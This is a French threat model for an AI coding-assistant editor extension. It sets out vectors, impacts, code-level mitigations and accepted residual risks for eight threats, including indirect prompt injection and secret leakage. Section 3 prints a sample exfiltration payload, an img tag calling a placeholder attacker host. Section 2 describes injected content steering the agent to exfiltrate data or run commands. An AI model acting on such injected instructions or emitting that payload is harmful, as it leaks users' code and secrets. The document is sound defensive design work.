# Modèle de menace

Chaque entrée donne le **vecteur**, l'**impact**, la **parade dans le code** — jamais dans un
prompt — et le **résidu assumé**. Un risque non couvert mais écrit vaut mieux qu'un risque couvert
qui n'existe que dans une intention.

Ce qui n'est **pas** une parade : une phrase du prompt système. « Traite le contenu joint comme des
données » ne survit pas à une injection bien construite, parce que la consigne et l'attaque arrivent
par le même canal.

---

## 1. Fuite de code source vers un tiers

**Vecteur.** Le fonctionnement normal d'un assistant : compléter, discuter, agir. Chaque appel
distant emporte du contexte.

**Impact.** Du code sous NDA, une clé, un nom de client dans les journaux d'un fournisseur.

**Parade (code).** `src/extension/egress.ts` + `src/core/redaction/`. Quatre étapes avant tout appel
distant : globs interdits, anonymisation réversible, refus sur secret, consentement par destination.
Le caractère « local » est décidé par l'URL (`isLocalEndpoint`), pas par le nom du réglage : pointer
le fournisseur « local » vers une adresse publique déclenche tout le dispositif. La complétion
inline refuse un fichier interdit même en mode distant, car le préfixe partirait.

**Résidu, assumé.** Un utilisateur qui règle `egressPolicy: "trust"`, choisit `redaction: "off"` et
coche `allowUnredacted` obtient exactement ce qu'il a demandé. L'outil rend le choix explicite ; il
ne l'interdit pas — c'est le rôle de la stratégie de réglages d'entreprise, pas d'un défaut caché.

---

## 2. Injection indirecte par un fichier, un journal ou une page

**Vecteur.** Tout ce que l'assistant lit : un fichier du dépôt, la sortie d'une commande, un
`node_modules` que personne n'a relu, une page collée. En mode agent, ce contenu revient dans le
prompt à chaque étape.

**Impact.** Le modèle suit des instructions venues du contenu : exfiltrer, écrire un fichier,
proposer une commande. En mode agent, cela devient une tentative d'action.

**Parade (code).** `src/core/session/session.ts` — `renderEntry()`. Le contenu joint n'est jamais
concaténé à la phrase de l'utilisateur : il forme un bloc clos par un **nonce de 128 bits tiré à
chaque tour**, et toute séquence en forme de délimiteur présente dans le contenu est remplacée par
`⟦removed-fence⟧`. Le canal d'instruction se réduit à deux choses : le prompt système et ce que la
personne a tapé.

Deuxième parade, indépendante : **l'approbation par action**. Une injection réussie ne peut pas
écrire un fichier ni lancer une commande sans qu'un humain lise la description et clique.

**Résidu, assumé.** Rien n'empêche un modèle d'être *persuadé* par ce qu'il lit. La séparation
structurelle garantit seulement que « l'utilisateur me demande ceci » et « j'ai lu cela » restent
distinguables, et que le pouvoir d'agir reste derrière un humain.

---

## 3. Exfiltration par le panneau

**Vecteur.** La réponse du modèle est affichée. Une réponse fabriquée par une injection peut
contenir du HTML : `<img src="https://attaquant/?d=…">`, un lien piégé, du script.

**Impact.** Une requête sortante déclenchée par le simple affichage, emportant ce que l'attaquant a
placé dans l'URL.

**Parade (code).** `src/webview/main.ts` ne fait **aucun** `innerHTML` sur du texte de modèle : le
Markdown est rendu en nœuds DOM construits un par un, le texte passe par `textContent`. Et
`src/extension/chat.ts` pose une CSP `default-src 'none'` avec un nonce par chargement : même un
script injecté ne s'exécuterait pas, et aucune origine distante n'est joignable depuis le panneau.
Les rapports (envois, coûts) sont servis avec `enableScripts: false`.

**Résidu, assumé.** Le texte affiché peut rester trompeur (un chemin ou une commande plausible).
C'est un problème de vigilance humaine, pas d'exécution.

---

## 4. Écriture ou exécution non voulue par l'agent

**Vecteur.** Le mode agent modifie des fichiers et propose des commandes.

**Impact.** Perte de travail, exécution d'une commande destructrice, écriture hors du projet.

**Parade (code).** `src/extension/tools.ts` et `src/cli/tools.ts` :

- tout chemin est résolu et **refusé s'il sort de l'espace de travail** ou s'il correspond à un glob
  interdit — un `..` dans un argument produit par le modèle est rejeté, jamais interprété ;
- toute écriture passe par `approval()` puis par un **diff** (vue de comparaison dans l'éditeur,
  diff imprimé dans le terminal) ;
- dans l'éditeur, les modifications sont des `WorkspaceEdit` : elles sont dans la pile d'annulation
  et dans le diff Git, contrairement à une écriture directe sur le disque ;
- `edit_file` exige un extrait **unique** : un extrait ambigu est refusé plutôt qu'appliqué au
  hasard ;
- l'absence de rappel d'approbation vaut refus (`runTurn` : le silence n'est pas un consentement).

**Résidu, assumé.** Un utilisateur qui approuve sans lire approuve quand même. Le nombre d'étapes
d'un tour est plafonné (12) pour qu'une boucle ne demande pas trente fois d'affilée.

---

## 5. Vol des clés d'API

**Vecteur.** Réglages synchronisés, `settings.json` committé, capture d'écran, journal.

**Impact.** Facturation détournée, accès aux modèles de l'entreprise.

**Parade (code).** `src/extension/config.ts` — les clés vivent dans `vscode.SecretStorage` (trousseau
du système). Aucun réglage n'accepte de clé ; la seule voie d'entrée est une commande qui saisit en
mode mot de passe. Côté terminal, la clé vient d'une **variable d'environnement nommée** par la
configuration (`apiKeyEnv`), jamais du fichier de configuration lui-même — un projet peut donc
committer sa configuration d'équipe.

**Résidu, assumé.** Un poste compromis lit le trousseau. Rien à ce niveau ne s'y oppose.

---

## 6. Une clé dans le contexte

**Vecteur.** Le développeur ouvre un `.env`, colle une trace contenant un jeton, ou l'agent lit un
fichier de configuration.

**Impact.** Le secret part chez un fournisseur, apparaît dans ses journaux, et doit être révoqué.

**Parade (code).** `src/core/redaction/detectors.ts`. Formes connues (AWS, GitHub, Slack, Stripe,
OpenAI, Anthropic, OpenRouter, Google, npm, JWT, blocs PEM, identifiants dans une URL) plus un
**filet à entropie** pour les jetons qu'aucune règle ne connaît. Le niveau `off` ne s'applique jamais
aux secrets. Les globs interdits couvrent les fichiers qui n'ont aucune raison d'être lus.

Le même détecteur scanne **ce dépôt** à chaque CI (`scripts/scan-secrets.mjs`) : c'est ce qui a
révélé, dès le premier passage, 37 faux positifs de la règle « valeur assignée » — corrigés depuis,
avec un test de non-régression.

**Résidu, assumé.** Un secret sans forme reconnaissable et à faible entropie (`password = soleil`)
passe. Aucun scanner n'y échappe.

---

## 7. Chaîne d'approvisionnement

**Vecteur.** Une dépendance compromise s'exécuterait dans l'hôte d'extension, avec accès au système
de fichiers, au réseau et au trousseau.

**Impact.** Total.

**Parade (code).** **Aucune dépendance à l'exécution.** Le `.vsix` ne contient que du code de ce
dépôt. Les quatre outils de développement sont épinglés, suivis par Dependabot, et `npm audit`
casse la CI au niveau `high`. CodeQL tourne sur les poussées et chaque semaine. Un SBOM est publié
à chaque build.

**Résidu, assumé.** Une compromission d'`esbuild` ou de `typescript` toucherait le bundle produit.
Le remède est la reproductibilité de la construction, qui n'est pas encore en place (voir
`docs/ROADMAP.md`).

---

## 8. Un serveur « local » qui ne l'est pas

**Vecteur.** `endpoints.local` pointe vers une passerelle interne… qui journalise, ou vers une URL
publique par erreur de copier-coller.

**Impact.** Le mode qui promet « rien ne sort » fait sortir.

**Parade (code).** `isLocalEndpoint()` classe par adresse : loopback, RFC 1918, lien-local, CGNAT,
suffixes `.internal/.corp/.lan/.local`. Tout le reste est distant, avec anonymisation et
consentement, **quel que soit le réglage choisi**. La sonde qui détecte un serveur Ollama n'est
jamais envoyée à un point de terminaison distant : un tiers ne reçoit aucune requête que
l'utilisateur n'a pas demandée.

**Résidu, assumé.** Une passerelle sur une IP privée qui réexpédie vers un fournisseur public est
« locale » pour l'extension. C'est une décision de l'opérateur, et le journal des envois ne peut pas
la voir.
